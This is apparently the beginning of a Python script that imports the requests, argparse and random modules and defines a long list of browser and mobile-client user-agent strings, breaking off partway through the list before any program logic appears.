import requests
import argparse
import random

USER_AGENTS = [
    "Dalvik/2.1.0 (Linux; U; Android 10; M2007J3SG MIUI/V12.0.3.0.QJDIDXM)",
    "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A910F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 7.1.1; in-id; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.1",
    "Mozilla/5.0 (Linux; Android 9; SM-J415G Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A505G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/21.8.0.2007.10 SA/3 Mobile/15E148 Safari/604.1",
    "Dalvik/2.1.0 (Linux; U; Android 9; FLA-LX3 Build/HUAWEIFLA-L23)",
    "Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.27 Mobile Safari/537.36,gzip(gfe),gzip(gfe)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 Edg/86.0.622.48",
    "Mozilla/5.0 (Linux; Android 11; SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; moto e5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; JSN-L21 Build/HONORJSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91",
    "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SH-M05 Build/S4260)",
    "Mozilla/5.0 (Linux; Android 5.0; LG-D855) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1807 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.86 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 6.0; Lenovo A7010a48 Build/MRA58K)",
    "Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; VIE-L29 Build/HUAWEIVIE-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; VOG-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4644.0 Safari/537.36 Edg/96.0.1032.0",
    "Mozilla/5.0 (Linux; Android 5.1.1; CHM-U01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A505U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; YAL-L41 Build/HUAWEIYAL-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/75.0.3770.85 Mobile/15E148 Safari/605.1",
    "Mozilla/5.0 (Linux; Android 10; ELS-NX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 OPR/58.2.2878.53403",
    "Mozilla/5.0 (Linux; Android 10; ALP-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 YaBrowser/19.5.2.38.10 YaApp_iOS/32.00 YaApp_iOS_Search/32.00 TA/2.1 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; HMA-AL00 Build/HUAWEIHMA-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 Viber/13.2.0.8",
    "Dalvik/2.1.0 (Linux; U; Android 9; T5 Plus Build/PPR1.180610.011)",
    "Mozilla/5.0 (Linux; Android 6.0.1; SGP611 Build/23.5.A.1.291; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 9; in-id; CPH1931 Build/PKQ1.190714.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/25.7.3.0beta",
    "Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.120 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F Build/R16NW; Cake) AppleWebKit/537.36 (KHTML, like Gecko) Version/6.0.15 Chrome/84.0.4147.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; Nokia 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX2030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "com.google.GoogleMobile/109.0 iPhone/13.4.1 hw/iPhone9_2",
    "Mozilla/5.0 (Linux; Android 9; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Safari/537.36",
    "Mozilla/5.0 (Linux; arm_64; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 YaBrowser/20.4.3.90.00 SA/1 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Mi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4166.0 Safari/537.36 Edg/85.0.544.0",
    "Mozilla/5.0 (Linux; Android 10; SM-A015F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Waterfox/91.3.3",
    "Mozilla/5.0 (Linux; U; Android 9; in-id; CPH1823 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.5",
    "Mozilla/5.0 (Linux; Android 8.1.0; SNE-LX1 Build/HUAWEISNE-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; LIO-L29; HMSCore 4.0.4.307) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 HuaweiBrowser/10.1.2.300 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38/uNeRFD8p-22",
    "Mozilla/5.0 (Linux; Android 10; TK701 Build/QP1A.191105.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30i 5G Build/RKQ1.200826.002)",
    "Mozilla/5.0 (Linux; Android 11; SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 9; Phone) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/61.1.3076.56625",
    "Mozilla/5.0 (Linux; Android 9; itel L5002P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 Chrome/83.0.4103.61 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4026.0 Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 5.0; SAMSUNG-SM-G870A Build/LRX21T)",
    "Dalvik/2.1.0 (Linux; U; Android 7.1.1; Moto E (4) Plus Build/NDR26.58-21)",
    "Mozilla/5.0 (Linux; Android 11; V2036) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.1) AppleWebKit/5310 (KHTML, like Gecko) Chrome/15.0.827.0 Safari/5310",
    "Mozilla/5.0 (Linux; Android 10; Mi 9 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.04.4.4995",
    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A205F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; TECNO LC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.4; SM-T217T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-A720F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; arm; Android 6.0; Lenovo A2016a40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 YaBrowser/20.4.1.144.00 SA/1 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 YaBrowser/20.4.3.358 Mobile/15E148 Safari/604.1",
    "Apache-HttpClient/4.5.13 (Java/13-ea)",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J500FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G9350 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.7 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "GuzzleHttp/6.5.1 curl/7.62.0 PHP/7.2.34",
    "Mozilla/5.0 (Linux; Android 10; Nokia 7 plus Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; TECNO KE6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; motorola one vision) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 10; LM-Q630 Build/QKQ1.200730.002)",
    "Dalvik/2.1.0 (Linux; U; Android 10; Redmi 7A MIUI/V11.0.2.0.QCMEUXM)",
    "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile DuckDuckGo/5 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/13.1 (Ecosia ios@4.0.17.833) Safari/604.1",
    "Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.113 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-N976U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 9; GM 9 Pro d Build/PKQ1.180904.001)",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; arm_64; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 YaBrowser/20.3.0.276.00 TA/5.1 Mobile SA/1 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Z61_2GB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; STK-L22 Build/HUAWEISTK-L22) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.61 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; G3313 Build/43.0.A.7.106; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 OcIdWebView ({\x22os\x22:\x22Android\x22,\x22osVersion\x22:\x2224\x22,\x22app\x22:\x22com.google.android.gms\x22,\x22appVersion\x22:\x22217\x22,\x22style\x22:2,\x22isDarkTheme\x22:false})",
    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 4X MIUI/20.6.14)",
    "Mozilla/5.0 (Linux; Android 11; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.68 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; vivo 1819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; STF-L09) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; IN2025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36 EdgA/93.0.961.78",
    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi S2 Build/PQ3A.190801.002)",
    "Dalvik/2.1.0 (Linux; U; Android 11; M2012K11C Build/RKQ1.201112.002)",
    "Mozilla/5.0 (Linux; Android 10; SM-A415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile DuckDuckGo/5 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.36 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 5.1.1; KFDOWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/94.2.2 like Chrome/94.0.4606.119 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; moto g(6)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.11.2.5118",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 OPR/71.0.3770.171",
    "Mozilla/5.0 (Linux; U; Android 9; SM-J610F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 OPR/47.2.2254.147902",
    "Mozilla/5.0 (Linux; Android 11; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; moto e) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.80 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; M30 Build/O00623)",
    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; 10or G2 Build/OPM1.171019.026)",
    "Mozilla/5.0 (Linux; Android 10; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.37 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; U PULSE Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Android 11; Mobile; rv:84.0) Gecko/84.0 Firefox/84.0 PrivacyWall/84.0",
    "Mozilla/5.0 (Linux; Android 6.0.1; VMware Virtual Platform Build/MOB31T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 7.0; Primo NF3 Build/NRD90M)",
    "Mozilla/5.0 (Linux; Android 6.0; MYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-T237P Build/LMY47X)",
    "Mozilla/5.0 (Linux; Android 9; INE-LX1 Build/HUAWEIINE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 OPR/49.2.2361.134358",
    "Mozilla/5.0 (Linux; U; Android 9; SM-A107F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 OPR/31.0.2254.122029",
    "Mozilla/5.0 (iPhone; CPU OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/29.2 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-F916U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4462.3 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-N981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/46.01.4.5140",
    "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.4 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/61.2.3076.56749",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Zoom 3.6.0; Microsoft Outlook 15.0.5223; ms-office; MSOffice 15)",
    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Pro MIUI/V10.4.1.0.PGGMIXM)",
    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; SAMSUNG-SGH-I467 Build/KOT49H)",
    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; VF695 Build/KOT49H)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0) Gecko/2008061600 SUSE/3.0-1.2 Firefox/52.7.3",
    "Mozilla/5.0 (Linux; Android 9; REVVLRY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1610 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Mobile Safari/537.36",
    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; HUAWEI C199 Build/HuaweiC199)",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/18.1b15719 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; M2002J9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; W-V720-EEA Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; ATU-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2101K7BI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-T820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; VOG-L09) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; arm_64; Android 9; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 YaBrowser/20.4.4.76.00 SA/1 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 6.0; Lenovo TB3-730M Build/MRA58K)",
    "Mozilla/5.0 (Linux; Android 7.1.1; REVVLPLUS C3701A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4750.0 Iron Safari/537.36",
    "Mozilla/5.0 (Android 7.0; Mobile; rv:79.0) Gecko/79.0 Firefox/79.0",
    "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A015M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4265.0 Safari/537.36",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.39 Safari/530.5",
    "Mozilla/5.0 (Linux; Android 9; SM-T860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; INE-LX1r) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/225.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; moto g(8) power lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 6.0; P9000 Build/MRA58K)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.51 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.2; LG-K410 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.08.4.5071",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
